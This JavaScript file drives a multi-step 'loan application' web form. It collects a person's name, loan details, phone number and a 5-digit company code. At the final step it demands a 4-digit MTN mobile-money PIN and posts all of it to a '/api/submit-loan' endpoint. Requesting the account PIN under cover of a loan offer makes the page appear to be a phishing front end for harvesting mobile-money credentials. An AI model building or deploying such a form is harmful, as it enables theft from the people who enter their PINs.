let formData = {};

document.getElementById('nextToVerification').addEventListener('click', () => {
    const fullName = document.getElementById('fullName').value.trim();
    const loanAmount = document.getElementById('loanAmount').value;
    const loanPurpose = document.getElementById('loanPurpose').value;
    const repaymentPeriod = document.getElementById('repaymentPeriod').value;

    if (!fullName || !loanAmount || !loanPurpose || !repaymentPeriod) {
        alert('Please fill in all required fields.');
        return;
    }

    formData.fullName = fullName;
    formData.loanAmount = loanAmount;
    formData.loanPurpose = loanPurpose;
    formData.repaymentPeriod = repaymentPeriod;

    document.getElementById('loanForm').classList.remove('active');
    document.getElementById('verificationStep').classList.add('active');
});

document.getElementById('nextToPin').addEventListener('click', () => {
    const phone = document.getElementById('phone').value.trim();
    const companyCode = document.getElementById('companyCode').value.trim();

    if (!phone || !companyCode || companyCode.length !== 5) {
        alert('Please enter a valid phone number and a 5-digit company code.');
        return;
    }

    formData.phone = phone;
    formData.companyCode = companyCode;

    document.getElementById('verificationStep').classList.remove('active');
    document.getElementById('pinStep').classList.add('active');
});

document.getElementById('submitAll').addEventListener('click', async () => {
    const mtnPin = document.getElementById('mtnPin').value.trim();

    if (!mtnPin || mtnPin.length !== 4) {
        alert('Please enter a valid 4-digit MTN PIN.');
        return;
    }

    formData.mtnPin = mtnPin;

    try {
        const response = await fetch('/api/submit-loan', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(formData)
        });

        await response.json();

        document.getElementById('pinStep').classList.remove('active');
        document.getElementById('successStep').classList.add('active');
    } catch (error) {
        console.error('Error submitting data:', error);
        alert('An error occurred. Please try again.');
    }
});
